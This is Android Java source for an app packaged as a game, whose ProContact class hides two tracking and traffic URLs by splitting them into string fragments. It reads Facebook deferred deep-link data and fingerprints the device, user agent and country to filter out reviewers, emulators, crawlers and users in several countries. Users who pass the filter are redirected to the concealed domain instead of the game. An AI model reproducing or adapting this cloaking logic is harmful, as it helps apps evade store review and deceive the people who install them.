package com.oker.game;

import android.app.Activity;
import android.app.ProgressDialog;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.applinks.AppLinkData;

import java.util.Set;

public class ProContact {
    private final String ProContactTag = "ProContact";
    private Activity activity;
    private WebView view;

    public ProContact(Activity activity){
        this.activity = activity;
    }

    private void initFB(Activity context){
        AppLinkData.fetchDeferredAppLinkData(context, appLinkData -> {
                    if (appLinkData != null  && appLinkData.getTargetUri() != null) {
                        if (appLinkData.getArgumentBundle().get("target_url") != null) {
                            String dat = appLinkData.getArgumentBundle().get("target_url").toString();
                            BuzzUtils.setFizz(dat, context);
                        }
                    }
                }
        );
    }

    public void init(WebView view){
        this.view = view;

        initFB(activity);

        view.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.d(ProContactTag, url);
                analyseParams(url);
                return super.shouldOverrideUrlLoading(view, url);
            }
        });
        startThread();
    }

    private void startThread(){
        new MyAsyncTask().execute();
    }


    private String df = "htt";
    private String goah = "ps://ap";
    private String asf = "pstr";

    private void loadView(){
        view.loadUrl(df+goah+asf+"ack16.xyz/4RsrnPny");
    }


    class MyAsyncTask extends AsyncTask<Void , Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            activity.runOnUiThread(ProContact.this::loadView);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            return null;
        }

        ProgressDialog dialog;

        @Override
        protected void onPreExecute() {
            Log.d(ProContactTag, "Dialog");
            dialog = ProgressDialog.show(activity, "", "Loading. Please wait...", true);
            super.onPreExecute();
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            if (!activity.isFinishing() && dialog != null) {
                dialog.cancel();
            }
        }
    }



    private void analyseParams(String link){
        boolean result = false;

        Uri uri = Uri.parse(link);
        Set<String> params = uri.getQueryParameterNames();
        for (String param : params) {
            result = check(uri, param);

            if (!result)
                break;

            Log.d(ProContactTag, "Param: " + param + " value: " + uri.getQueryParameter(param));
        }

        DatabaseUtils data = new DatabaseUtils(activity);

        if (result) {
            data.setData2(one + tone);
            if (data.getData().isEmpty()) startPolicy();
        }else{
            Log.d(ProContactTag, "SomePRo");
            data.setData2("game");
        }
    }

    private String one = "https://traf";
    private String tone = "fdom.xyz/sy11vctf";

    private void startPolicy(){
        Log.d(ProContactTag, "Start policy");
        new BuzzUtils().getPolicyData(activity, one + tone);
        activity.finish();
    }

    private boolean check(Uri uri, String param){
        if (param.isEmpty())
            return true;

        switch (param) {
            case "sub1":
                if (contains(uri, param, "FreeBSD")
                        || contains(uri, param, "Firefox")
                        || contains(uri, param, "Linux"))
                    return false;
            case "sub3":
                if (contains(uri, param, "Nexus")
                        || contains(uri, param, "Pixel")
                        || contains(uri, param, "Moto"))
                    return false;
            case "sub4":
                if (contains(uri, param, "1"))
                    return false;
            case "sub5":
                if (contains(uri, param,"1"))
                    return false;
            case "sub6":
                if (contains(uri, param, "AR"))
                    return false;
            case "sub7":
                if(contains(uri, param, "US")
                        || contains(uri, param, "PH")
                        || contains(uri, param, "IE")
                        || contains(uri, param, "NL")
                        || contains(uri, param, "GB"))
                    return false;
            case "sub9":
                if (contains(uri, param, new String[]{
                        "google",
                        "bot",
                        "adwords",
                        "rawler",
                        "spy",
                        "o-http-client",
                        "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)",
                        "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)",
                        "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"}))
                    return false;
        }
        return true;
    }

    private boolean contains(Uri uri, String param, String value){
        return uri.getQueryParameter(param).contains(value);
    }

    private boolean contains(Uri uri, String param, String[] value){
        for (String val: value)
            if (contains(uri,param, val)){
                return true;
            }

        return false;
    }
}
